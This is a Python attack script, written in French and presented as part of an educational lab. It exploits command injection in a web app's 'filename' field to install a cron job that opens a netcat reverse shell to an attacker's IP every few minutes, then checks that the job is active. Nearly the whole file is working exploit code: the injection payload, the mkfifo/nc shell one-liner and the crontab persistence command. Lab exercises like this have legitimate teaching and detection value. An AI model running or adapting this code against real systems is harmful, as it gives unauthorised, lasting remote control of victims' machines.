#!/usr/bin/env python3
"""
Phase 3 : Persistence (Persistance)
MITRE ATT&CK : TA0003 - Persistence
Technique : T1053.003 - Scheduled Task/Job: Cron

Copyright © 2025 Mohammed Bencheikh - Be One And Move Academy
USAGE ÉDUCATIF ET ÉTHIQUE UNIQUEMENT - NE PAS UTILISER EN DEHORS DU CADRE AUTORISÉ

Description :
Cette phase établit un mécanisme de persistance en créant une tâche cron.
La persistance garantit que l'attaquant conserve son accès même si le système
redémarre ou si la connexion initiale est perdue.

Objectif pédagogique :
- Comprendre les mécanismes de persistance sous Linux
- Observer la création de fichiers cron dans les logs Sysmon
- Identifier les tâches planifiées suspectes
"""

import requests
import sys
import json

def establish_persistence_cron(target_ip, target_port, attacker_ip, listener_port, interval_minutes=5):
    """
    Crée une tâche cron pour maintenir la persistance.
    
    Paramètres :
        target_ip (str) : Adresse IP de la machine victime
        target_port (int) : Port de l'application web vulnérable
        attacker_ip (str) : Adresse IP de l'attaquant (pour le callback)
        listener_port (int) : Port du listener de l'attaquant
        interval_minutes (int) : Intervalle en minutes entre chaque tentative de reconnexion
    
    Retour :
        dict : Résultat de l'opération
    """
    
    url = f"http://{target_ip}:{target_port}/search"
    
    # Commande de reverse shell (identique à la Phase 2)
    reverse_shell_cmd = f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {attacker_ip} {listener_port} > /tmp/f"
    
    # Création de la tâche cron
    # Format cron : minute heure jour mois jour_semaine commande
    # */{interval_minutes} * * * * signifie "toutes les X minutes"
    cron_entry = f"*/{interval_minutes} * * * * {reverse_shell_cmd}"
    
    # Commande pour ajouter la tâche cron
    # (crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -
    # Explication :
    #   - crontab -l : Liste les tâches cron existantes
    #   - 2>/dev/null : Ignore les erreurs si aucune crontab n'existe
    #   - echo "{cron_entry}" : Ajoute la nouvelle tâche
    #   - | crontab - : Installe la nouvelle crontab
    
    persistence_cmd = f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -'
    
    # Payload complet
    payload = f"test.txt'; {persistence_cmd} #"
    
    data = {
        'filename': payload
    }
    
    print(f"[*] Établissement de la persistance via cron...")
    print(f"[*] Victime : {target_ip}:{target_port}")
    print(f"[*] Callback : {attacker_ip}:{listener_port}")
    print(f"[*] Intervalle : Toutes les {interval_minutes} minutes")
    print(f"[*] Entrée cron : {cron_entry}")
    
    try:
        response = requests.post(url, data=data, timeout=10)
        
        if response.status_code == 200:
            print(f"[+] Tâche cron créée avec succès !")
            print(f"[+] Le système tentera de se reconnecter toutes les {interval_minutes} minutes")
            print(f"[!] Pour vérifier : Exécutez 'crontab -l' sur la victime")
            
            result = {
                "success": True,
                "status_code": response.status_code,
                "technique": "T1053.003",
                "tactic": "TA0003 - Persistence",
                "description": f"Tâche cron créée (intervalle : {interval_minutes} min)",
                "cron_entry": cron_entry,
                "persistence_command": persistence_cmd,
                "verification": "Exécuter 'crontab -l' sur la victime pour vérifier"
            }
            
            return result
        else:
            print(f"[-] Échec de la création de la tâche cron. Code HTTP : {response.status_code}")
            return {
                "success": False,
                "error": f"HTTP {response.status_code}",
                "technique": "T1053.003",
                "tactic": "TA0003 - Persistence"
            }
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Erreur lors de la création de la persistance : {e}")
        return {
            "success": False,
            "error": str(e),
            "technique": "T1053.003",
            "tactic": "TA0003 - Persistence"
        }

def verify_persistence(target_ip, target_port):
    """
    Vérifie que la tâche cron a bien été créée.
    """
    print(f"\n[*] Vérification de la persistance...")
    
    # Commande pour lister les tâches cron
    verify_cmd = "crontab -l"
    payload = f"test.txt'; {verify_cmd} #"
    
    url = f"http://{target_ip}:{target_port}/search"
    data = {'filename': payload}
    
    try:
        response = requests.post(url, data=data, timeout=10)
        
        if "nc" in response.text or "mkfifo" in response.text:
            print(f"[+] Persistance confirmée ! La tâche cron est active.")
            return True
        else:
            print(f"[-] Impossible de confirmer la persistance.")
            return False
            
    except Exception as e:
        print(f"[-] Erreur lors de la vérification : {e}")
        return False

def main():
    """
    Fonction principale
    """
    
    if len(sys.argv) < 5:
        print("Usage : python3 phase3_persistence.py <TARGET_IP> <TARGET_PORT> <ATTACKER_IP> <LISTENER_PORT> [INTERVAL_MINUTES]")
        print("Exemple : python3 phase3_persistence.py 172.20.0.3 5000 172.20.0.2 4444 5")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    attacker_ip = sys.argv[3]
    listener_port = int(sys.argv[4])
    interval_minutes = int(sys.argv[5]) if len(sys.argv) > 5 else 5
    
    # Exécution de l'attaque
    result = establish_persistence_cron(target_ip, target_port, attacker_ip, listener_port, interval_minutes)
    
    # Vérification
    if result["success"]:
        verify_persistence(target_ip, target_port)
    
    # Affichage du résultat
    print("\n" + "="*60)
    print("RÉSULTAT DE L'ATTAQUE (JSON)")
    print("="*60)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    return result

if __name__ == "__main__":
    main()
